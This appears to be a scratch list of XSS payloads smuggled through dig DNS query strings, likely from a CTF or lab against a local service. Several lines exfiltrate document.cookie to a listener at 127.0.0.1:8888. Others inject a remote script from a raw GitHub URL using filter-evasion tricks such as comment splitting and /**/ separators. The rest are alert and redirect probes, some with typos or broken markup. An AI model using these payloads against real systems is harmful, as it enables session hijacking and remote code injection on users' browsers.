dig  "www.google.com 127.0.0.1 2 0 IP<scipt>document.write('<img src=\"http://127.0.0.1:8888/?'+document.cookie+'\"/>');</script> 1736" @127.0.0.1

dig  "www.google.com 127.0.0.1 2 0 IP\"<scipt>document.location='http://127.0.0.1:8888/'+document.cookie</script>\" 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>alert(8);</script> 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 1736" @127.0.0.1



dig  "www.google.com 127.0.0.1 2 0 IP<script>document.location='/';</script> 1736" @127.0.0.1

dig  "www.google.com 127.0.0.1 2 0 IP<script>document.body.append(document.createElement('script',{src:'https://raw.githubusercontent.com/B00TK1D/p/master/e.js'}));</script> 1736" @127.0.0.1

document.body.innerHTML=document.body.innerHTML+"<script>Hello!</div>";




dig  "www.google.com 127.0.0.1 2 0 IP<script<\!---->src=\"https://raw.githubusercontent.com/B00TK1D/p/master/e.js\"></script> 1736" @127.0.0.1


dig  "www.google.com 127.0.0.1 2 0 IP<script>document.body.innerHTML+='<script/**/src=\"https://raw.githubusercontent.com/B00TK1D/p/master/e.js\"></script>';</script> 1736" @127.0.0.1

<script>document.body.innerHTML+='<script/**/src="https://raw.githubusercontent.com/B00TK1D/p/master/e.js"></script>';</script>

<script>
document.body.innerHTML+='<script//src="https://raw.githubusercontent.com/B00TK1D/p/master/e.js"></script>'
;</script>

